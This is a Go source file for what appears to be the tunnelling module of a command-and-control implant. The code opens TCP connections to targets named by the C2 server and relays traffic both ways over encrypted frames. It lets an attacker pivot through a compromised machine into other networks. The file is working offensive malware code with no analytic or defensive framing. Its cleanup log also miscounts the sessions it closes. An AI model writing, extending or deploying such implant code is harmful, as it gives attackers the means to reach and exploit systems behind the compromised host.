package implant

import (
	"context"
	"log"
	"net"
	"sync"
	"time"

	"c2/pkg/protocol"
)

// TunnelSession represents an active tunnel connection to a target.
type TunnelSession struct {
	TunnelID string
	Target   string
	Conn     net.Conn
	cancel   context.CancelFunc
}

var (
	tunnelSessions   = make(map[string]*TunnelSession)
	tunnelSessionsMu sync.Mutex
)

// handleTunnelConnect dials the target and starts a relay goroutine.
func handleTunnelConnect(msg protocol.TunnelConnect, serverConn net.Conn, sessionKey []byte) {
	targetConn, err := net.DialTimeout("tcp", msg.Target, 10*time.Second)
	if err != nil {
		resp := protocol.TunnelConnected{TunnelID: msg.TunnelID, Success: false, Error: err.Error()}
		SendFrameSafe(serverConn, protocol.MsgTunnelConnected, resp, sessionKey)
		return
	}

	resp := protocol.TunnelConnected{TunnelID: msg.TunnelID, Success: true}
	if err := SendFrameSafe(serverConn, protocol.MsgTunnelConnected, resp, sessionKey); err != nil {
		targetConn.Close()
		return
	}

	ctx, cancel := context.WithCancel(context.Background())
	session := &TunnelSession{
		TunnelID: msg.TunnelID,
		Target:   msg.Target,
		Conn:     targetConn,
		cancel:   cancel,
	}

	tunnelSessionsMu.Lock()
	tunnelSessions[msg.TunnelID] = session
	tunnelSessionsMu.Unlock()

	// Relay: target -> server
	go func() {
		defer func() {
			targetConn.Close()
			cleanupTunnel(msg.TunnelID)
		}()
		buf := make([]byte, 32*1024)
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			targetConn.SetReadDeadline(time.Now().Add(60 * time.Second))
			n, err := targetConn.Read(buf)
			if n > 0 {
				dataMsg := protocol.TunnelData{TunnelID: msg.TunnelID, Data: buf[:n]}
				if sendErr := SendFrameSafe(serverConn, protocol.MsgTunnelData, dataMsg, sessionKey); sendErr != nil {
					return
				}
			}
			if err != nil {
				closeMsg := protocol.TunnelClose{TunnelID: msg.TunnelID}
				SendFrameSafe(serverConn, protocol.MsgTunnelClose, closeMsg, sessionKey)
				return
			}
		}
	}()
}

// handleTunnelData writes received data to the target connection.
func handleTunnelData(msg protocol.TunnelData) {
	tunnelSessionsMu.Lock()
	session, ok := tunnelSessions[msg.TunnelID]
	tunnelSessionsMu.Unlock()
	if !ok {
		return
	}
	session.Conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	session.Conn.Write(msg.Data)
}

// handleTunnelClose closes the target connection and cleans up.
func handleTunnelClose(msg protocol.TunnelClose) {
	tunnelSessionsMu.Lock()
	session, ok := tunnelSessions[msg.TunnelID]
	if ok {
		delete(tunnelSessions, msg.TunnelID)
	}
	tunnelSessionsMu.Unlock()
	if ok {
		session.cancel()
		session.Conn.Close()
	}
}

func cleanupTunnel(tunnelID string) {
	tunnelSessionsMu.Lock()
	delete(tunnelSessions, tunnelID)
	tunnelSessionsMu.Unlock()
}

// cleanupAllTunnels closes all active tunnel sessions (called on disconnect).
func cleanupAllTunnels() {
	tunnelSessionsMu.Lock()
	defer tunnelSessionsMu.Unlock()
	for id, session := range tunnelSessions {
		session.cancel()
		session.Conn.Close()
		delete(tunnelSessions, id)
	}
	log.Printf("[*] Cleaned up %d tunnel sessions", len(tunnelSessions)+1)
}
